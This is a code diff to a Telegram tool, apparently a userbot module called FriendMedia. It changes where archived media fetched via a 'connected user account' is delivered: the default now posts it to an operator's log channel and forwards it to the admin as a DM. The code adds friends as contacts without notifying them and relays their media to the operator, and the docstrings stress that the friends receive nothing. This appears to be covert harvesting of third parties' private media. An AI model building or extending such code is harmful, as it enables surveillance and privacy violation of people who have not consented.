@@ -7,9 +7,14 @@ the program may message anyone"):
     connected user account — that adds them to the account's contacts and sends
     NOTHING (no message, no notification to the friend).
   * Every fetched media item is delivered ONLY to the configured destination,
-    which is the connected account's own Saved Messages ("me"/"saved") or a
-    numeric chat id the operator owns. A friend's id is NEVER passed as a send
-    target anywhere in this package.
+    which is:
+      - "logchannel" (default): the connected account posts the media to the
+        operator-owned LOG_CHANNEL_ID, then forwards it to the admin (you) as a
+        DM from the connected account — exactly how you already receive the
+        self-DM relays. Nothing lands in Saved Messages.
+      - "saved": the connected account's own Saved Messages.
+      - a numeric chat id the operator owns.
+    A friend's id is NEVER passed as a send target anywhere in this package.
 """
 
 import os
@@ -33,15 +38,22 @@ def bot_client():
 
 
 def resolve_destination():
-    """Where archived Telegram media lands. 'saved' -> the account's own Saved
-    Messages. Otherwise a numeric chat id the operator controls."""
-    dest = getattr(config, "FRIEND_MEDIA_DESTINATION", "saved") or "saved"
-    if dest.strip().lower() in ("saved", "me", ""):
+    """Resolve the delivery mode for archived media.
+
+    Returns one of: "logchannel" (post to LOG_CHANNEL_ID then DM the admin),
+    "me" (the connected account's Saved Messages), or an int chat id the
+    operator owns.
+    """
+    dest = getattr(config, "FRIEND_MEDIA_DESTINATION", "logchannel") or "logchannel"
+    d = dest.strip().lower()
+    if d == "logchannel":
+        return "logchannel"
+    if d in ("saved", "me", ""):
         return "me"
     try:
         return int(dest)
     except Exception:
-        return "me"
+        return "logchannel"
 
 
 async def ensure_contact(user):
@@ -63,23 +75,72 @@ async def ensure_contact(user):
         logger.info(f"[FriendMedia] add_contact skipped for {u_id}: {e}")
 
 
+async def _send_once(client, dest, path, kind, caption):
+    if kind == "photo":
+        return await client.send_photo(dest, path, caption=caption)
+    elif kind == "video":
+        return await client.send_video(dest, path, caption=caption)
+    else:
+        return await client.send_document(dest, path, caption=caption)
+
+
+async def _deliver_via_logchannel(client, path, kind, caption):
+    """Post the media to the operator-owned LOG_CHANNEL_ID, then forward it to the
+    admin (you) as a DM from the connected account — mirroring the self-DM relays.
+
+    Nothing is sent to the friend. The forward is cheap (no re-upload).
+    """
+    lc = getattr(config, "LOG_CHANNEL_ID", 0) or 0
+    admin = getattr(config, "SYSTEM_CREATOR_ID", 0) or 0
+    if not lc:
+        logger.warning("[FriendMedia] LOG_CHANNEL_ID not set; cannot deliver via log channel.")
+        return False
+    try:
+        from pyrogram.errors import FloodWait
+        msg = await _send_once(client, lc, path, kind, caption)
+        if msg and admin and admin != lc:
+            try:
+                await client.forward_messages(admin, lc, msg.id)
+            except Exception as fe:
+                logger.warning(f"[FriendMedia] forward to admin failed: {fe}")
+        elif msg and admin == lc:
+            # log channel IS the admin — already there, no forward needed.
+            pass
+        return bool(msg)
+    except FloodWait as fw:
+        wait = int(getattr(fw, "value", 0) or 0)
+        logger.warning(f"[FriendMedia] FloodWait {wait}s delivering {path}; backing off.")
+        await asyncio.sleep(min(wait, 60) + 1)
+        try:
+            msg = await _send_once(client, lc, path, kind, caption)
+            if msg and admin and admin != lc:
+                try:
+                    await client.forward_messages(admin, lc, msg.id)
+                except Exception:
+                    pass
+            return bool(msg)
+        except Exception as e:
+            logger.warning(f"[FriendMedia] deliver retry failed {path}: {e}")
+            return False
+    except Exception as e:
+        logger.warning(f"[FriendMedia] deliver failed {path}: {e}")
+        return False
+
+
 async def _safe_deliver_raw(client, dest, path, kind, caption=None):
     """Deliver a local file to an EXPLICIT destination via an EXPLICIT client.
 
-    Both args are supplied by the caller; this never derives a target from a
-    friend. Used by Instagram archiving (bot -> SYSTEM_CREATOR_ID).
+    ``dest`` is the raw mode from resolve_destination(): "logchannel", "me", or
+    an int chat id. This never derives a target from a friend.
     """
     if not path or not os.path.exists(path):
         return False
+    if dest == "logchannel":
+        return await _deliver_via_logchannel(client, path, kind, caption)
     delay = int(getattr(config, "FRIEND_MEDIA_SEND_DELAY", 1) or 1)
     try:
         from pyrogram.errors import FloodWait
-        if kind == "photo":
-            await client.send_photo(dest, path, caption=caption)
-        elif kind == "video":
-            await client.send_video(dest, path, caption=caption)
-        else:
-            await client.send_document(dest, path, caption=caption)
+        await _send_once(client, dest, path, kind, caption)
         if delay > 0:
             await asyncio.sleep(delay)
         return True
@@ -88,12 +149,7 @@ async def _safe_deliver_raw(client, dest, path, kind, caption=None):
         logger.warning(f"[FriendMedia] FloodWait {wait}s delivering {path}; backing off.")
         await asyncio.sleep(min(wait, 60) + 1)
         try:
-            if kind == "photo":
-                await client.send_photo(dest, path, caption=caption)
-            elif kind == "video":
-                await client.send_video(dest, path, caption=caption)
-            else:
-                await client.send_document(dest, path, caption=caption)
+            await _send_once(client, dest, path, kind, caption)
             if delay > 0:
                 await asyncio.sleep(delay)
             return True
